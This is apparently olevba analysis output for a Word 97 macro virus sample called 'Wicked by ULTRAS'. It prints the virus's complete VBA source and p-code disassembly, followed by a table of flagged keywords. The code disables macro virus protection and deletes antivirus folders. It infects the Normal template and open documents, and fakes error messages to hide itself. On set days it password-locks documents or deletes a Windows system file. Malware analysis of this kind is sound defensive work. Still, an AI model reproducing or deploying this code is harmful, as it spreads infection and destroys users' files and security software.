olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ultras.Wicked
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ultras.Wicked - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Wicked.bas 
in file: Virus.MSWord.Ultras.Wicked - OLE stream: 'Macros/VBA/Wicked'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo Wicked
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Call Wicked
Kill "C:\Program Files\AntiViral Toolkit Pro\*.*"
Kill "C:\Program Files\Command Software\F-PROT95\*.*"
Kill "C:\Program Files\McAfee\VirusScan\*.*"
Kill "C:\Program Files\Norton AntiVirus\*.*"
Kill "C:\Program Files\FindVirus\*.*"
Kill "C:\f-macro\*.*"
Kill "C:\Tbavw95\*.*"
Call AutoClose
Wicked:
End Sub

Sub AutoClose()
On Error GoTo Wicked
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Application.UserName = "ULTRAS"
Application.UserInitials = "Wicked"
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
GlobalInfect = No
DocumentInfect = No
For u = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(u).Name = "Wicked" Then
GlobalInfect = Yes
End If
Next
For w = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(w).Name = "Wicked" Then
DocumentInfect = Yes
End If
Next
If GlobalInfect = No Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Wicked", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocumentInfect = No Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Wicked", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
WordBasic.FileSummaryInfo Author:="Wicked by ULTRAS"
Call Wicked
Wicked:
End Sub

Sub FileSaveAs()
Dialogs(wdDialogFileSaveAs).Show
On Error GoTo Wicked
Call Wicked
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Application.UserName = "ULTRAS"
Application.UserInitials = "Wicked"
WordBasic.DisableAutoMacros 0
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
GlobalInfect = No
DocumentInfect = No
For u = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(u).Name = "Wicked" Then
GlobalInfect = Yes
End If
Next
For w = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(w).Name = "Wicked" Then
DocumentInfect = Yes
End If
Next
If GlobalInfect = No Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Wicked", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocumentInfect = No Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Wicked", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
Wicked:
End Sub

Sub FilePrint()
On Error GoTo Wicked
Set ULTRAS = ActiveDocument.Range(Start:=0, End:=0)
With ULTRAS
.InsertBefore "WICKED BY ULTRAS"
.Font.Name = "Impact"
.Font.Size = 36
.Font.ColorIndex = 9
.Font.Shadow = 1
End With
Wicked:
Dialogs(wdDialogFilePrint).Show
End Sub

Sub ToolsMacro()
On Error Resume Next
beep
MsgBox " Not enought memory !! ", vbCritical + vbOKOnly + vbMsgBoxHelpButton + vbDefaultButton2, "WordBasic Err = 7"
End Sub

Sub ViewVBCode()
On Error Resume Next
beep
MsgBox " Not enought memory !! " & vbCrLf & "", vbExclamation + vbOKOnly + vbMsgBoxHelpButton + vbDefaultButton2, "WordBasic Err = 7"
End Sub

Sub FileTemplates()
beep
End Sub

Sub ToolsCustomize()
beep
End Sub

Sub Wicked()
On Error GoTo Wicked
If Day(Now()) = 3 Then
MsgBox "You Infected WM97.WICKED by ULTRAS", vbCritical + vbOKOnly, "ULTRAS"
ActiveDocument.Password = "WICKED"
ActiveDocument.Save
End If
If Day(Now()) = 16 Then
MsgBox "You Infected WM97.WICKED by ULTRAS", vbCritical + vbOKOnly, "ULTRAS"
SetAttr "c:\Windows\System\vmm32.vxd", 0
Kill "c:\Windows\System\vmm32.vxd"
End If
If Day(Now()) = 24 Then
MsgBox "You Infected WM97.WICKED by ULTRAS", vbCritical + vbOKOnly, "ULTRAS"
ActiveDocument.Password = "ULTRAS"
ActiveDocument.Save
End If
Wicked:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ultras.Wicked
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Wicked - 7093 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError Wicked 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	ArgsCall (Call) Wicked 0x0000 
' Line #5:
' 	LitStr 0x002A "C:\Program Files\AntiViral Toolkit Pro\*.*"
' 	ArgsCall Kill 0x0001 
' Line #6:
' 	LitStr 0x002E "C:\Program Files\Command Software\F-PROT95\*.*"
' 	ArgsCall Kill 0x0001 
' Line #7:
' 	LitStr 0x0025 "C:\Program Files\McAfee\VirusScan\*.*"
' 	ArgsCall Kill 0x0001 
' Line #8:
' 	LitStr 0x0025 "C:\Program Files\Norton AntiVirus\*.*"
' 	ArgsCall Kill 0x0001 
' Line #9:
' 	LitStr 0x001E "C:\Program Files\FindVirus\*.*"
' 	ArgsCall Kill 0x0001 
' Line #10:
' 	LitStr 0x000E "C:\f-macro\*.*"
' 	ArgsCall Kill 0x0001 
' Line #11:
' 	LitStr 0x000E "C:\Tbavw95\*.*"
' 	ArgsCall Kill 0x0001 
' Line #12:
' 	ArgsCall (Call) AutoClose 0x0000 
' Line #13:
' 	Label Wicked 
' Line #14:
' 	EndSub 
' Line #15:
' Line #16:
' 	FuncDefn (Sub AutoClose())
' Line #17:
' 	OnError Wicked 
' Line #18:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #19:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #20:
' 	LitStr 0x0006 "ULTRAS"
' 	Ld Application 
' 	MemSt UserName 
' Line #21:
' 	LitStr 0x0006 "Wicked"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #22:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #23:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #24:
' 	Ld No 
' 	St GlobalInfect 
' Line #25:
' 	Ld No 
' 	St DocumentInfect 
' Line #26:
' 	StartForVariable 
' 	Ld u 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #27:
' 	Ld u 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Wicked"
' 	Eq 
' 	IfBlock 
' Line #28:
' 	Ld Yes 
' 	St GlobalInfect 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	StartForVariable 
' 	Next 
' Line #31:
' 	StartForVariable 
' 	Ld w 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #32:
' 	Ld w 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Wicked"
' 	Eq 
' 	IfBlock 
' Line #33:
' 	Ld Yes 
' 	St DocumentInfect 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	StartForVariable 
' 	Next 
' Line #36:
' 	Ld GlobalInfect 
' 	Ld No 
' 	Eq 
' 	IfBlock 
' Line #37:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Wicked"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #38:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	Ld DocumentInfect 
' 	Ld No 
' 	Eq 
' 	IfBlock 
' Line #41:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Wicked"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #42:
' 	Ld ActiveDoc 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #45:
' 	LitStr 0x0010 "Wicked by ULTRAS"
' 	ParamNamed Author 
' 	Ld WordBasic 
' 	ArgsMemCall FileSummaryInfo 0x0001 
' Line #46:
' 	ArgsCall (Call) Wicked 0x0000 
' Line #47:
' 	Label Wicked 
' Line #48:
' 	EndSub 
' Line #49:
' Line #50:
' 	FuncDefn (Sub FileSaveAs())
' Line #51:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #52:
' 	OnError Wicked 
' Line #53:
' 	ArgsCall (Call) Wicked 0x0000 
' Line #54:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #55:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #56:
' 	LitStr 0x0006 "ULTRAS"
' 	Ld Application 
' 	MemSt UserName 
' Line #57:
' 	LitStr 0x0006 "Wicked"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #58:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #59:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #60:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #61:
' 	Ld No 
' 	St GlobalInfect 
' Line #62:
' 	Ld No 
' 	St DocumentInfect 
' Line #63:
' 	StartForVariable 
' 	Ld u 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #64:
' 	Ld u 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Wicked"
' 	Eq 
' 	IfBlock 
' Line #65:
' 	Ld Yes 
' 	St GlobalInfect 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	StartForVariable 
' 	Next 
' Line #68:
' 	StartForVariable 
' 	Ld w 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #69:
' 	Ld w 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Wicked"
' 	Eq 
' 	IfBlock 
' Line #70:
' 	Ld Yes 
' 	St DocumentInfect 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	StartForVariable 
' 	Next 
' Line #73:
' 	Ld GlobalInfect 
' 	Ld No 
' 	Eq 
' 	IfBlock 
' Line #74:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Wicked"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #75:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	Ld DocumentInfect 
' 	Ld No 
' 	Eq 
' 	IfBlock 
' Line #78:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Wicked"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #79:
' 	Ld ActiveDoc 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #80:
' 	EndIfBlock 
' Line #81:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #82:
' 	Label Wicked 
' Line #83:
' 	EndSub 
' Line #84:
' Line #85:
' 	FuncDefn (Sub FilePrint())
' Line #86:
' 	OnError Wicked 
' Line #87:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	ParamNamed Start 
' 	LitDI2 0x0000 
' 	ParamNamed End 
' 	Ld ActiveDocument 
' 	ArgsMemLd Range 0x0002 
' 	Set ULTRAS 
' Line #88:
' 	StartWithExpr 
' 	Ld ULTRAS 
' 	With 
' Line #89:
' 	LitStr 0x0010 "WICKED BY ULTRAS"
' 	ArgsMemCallWith InsertBefore 0x0001 
' Line #90:
' 	LitStr 0x0006 "Impact"
' 	MemLdWith Font 
' 	MemSt New 
' Line #91:
' 	LitDI2 0x0024 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #92:
' 	LitDI2 0x0009 
' 	MemLdWith Font 
' 	MemSt ColorIndex 
' Line #93:
' 	LitDI2 0x0001 
' 	MemLdWith Font 
' 	MemSt Shadow 
' Line #94:
' 	EndWith 
' Line #95:
' 	Label Wicked 
' Line #96:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #97:
' 	EndSub 
' Line #98:
' Line #99:
' 	FuncDefn (Sub ToolsMacro())
' Line #100:
' 	OnError (Resume Next) 
' Line #101:
' 	ArgsCall beep 0x0000 
' Line #102:
' 	LitStr 0x0017 " Not enought memory !! "
' 	Ld vbCritical 
' 	Ld vbOKOnly 
' 	Add 
' 	Ld vbMsgBoxHelpButton 
' 	Add 
' 	Ld vbDefaultButton2 
' 	Add 
' 	LitStr 0x0011 "WordBasic Err = 7"
' 	ArgsCall MsgBox 0x0003 
' Line #103:
' 	EndSub 
' Line #104:
' Line #105:
' 	FuncDefn (Sub ViewVBCode())
' Line #106:
' 	OnError (Resume Next) 
' Line #107:
' 	ArgsCall beep 0x0000 
' Line #108:
' 	LitStr 0x0017 " Not enought memory !! "
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	Ld vbExclamation 
' 	Ld vbOKOnly 
' 	Add 
' 	Ld vbMsgBoxHelpButton 
' 	Add 
' 	Ld vbDefaultButton2 
' 	Add 
' 	LitStr 0x0011 "WordBasic Err = 7"
' 	ArgsCall MsgBox 0x0003 
' Line #109:
' 	EndSub 
' Line #110:
' Line #111:
' 	FuncDefn (Sub FileTemplates())
' Line #112:
' 	ArgsCall beep 0x0000 
' Line #113:
' 	EndSub 
' Line #114:
' Line #115:
' 	FuncDefn (Sub ToolsCustomize())
' Line #116:
' 	ArgsCall beep 0x0000 
' Line #117:
' 	EndSub 
' Line #118:
' Line #119:
' 	FuncDefn (Sub Wicked())
' Line #120:
' 	OnError Wicked 
' Line #121:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #122:
' 	LitStr 0x0022 "You Infected WM97.WICKED by ULTRAS"
' 	Ld vbCritical 
' 	Ld vbOKOnly 
' 	Add 
' 	LitStr 0x0006 "ULTRAS"
' 	ArgsCall MsgBox 0x0003 
' Line #123:
' 	LitStr 0x0006 "WICKED"
' 	Ld ActiveDocument 
' 	MemSt Password 
' Line #124:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #125:
' 	EndIfBlock 
' Line #126:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0010 
' 	Eq 
' 	IfBlock 
' Line #127:
' 	LitStr 0x0022 "You Infected WM97.WICKED by ULTRAS"
' 	Ld vbCritical 
' 	Ld vbOKOnly 
' 	Add 
' 	LitStr 0x0006 "ULTRAS"
' 	ArgsCall MsgBox 0x0003 
' Line #128:
' 	LitStr 0x001B "c:\Windows\System\vmm32.vxd"
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #129:
' 	LitStr 0x001B "c:\Windows\System\vmm32.vxd"
' 	ArgsCall Kill 0x0001 
' Line #130:
' 	EndIfBlock 
' Line #131:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0018 
' 	Eq 
' 	IfBlock 
' Line #132:
' 	LitStr 0x0022 "You Infected WM97.WICKED by ULTRAS"
' 	Ld vbCritical 
' 	Ld vbOKOnly 
' 	Add 
' 	LitStr 0x0006 "ULTRAS"
' 	ArgsCall MsgBox 0x0003 
' Line #133:
' 	LitStr 0x0006 "ULTRAS"
' 	Ld ActiveDocument 
' 	MemSt Password 
' Line #134:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #135:
' 	EndIfBlock 
' Line #136:
' 	Label Wicked 
' Line #137:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

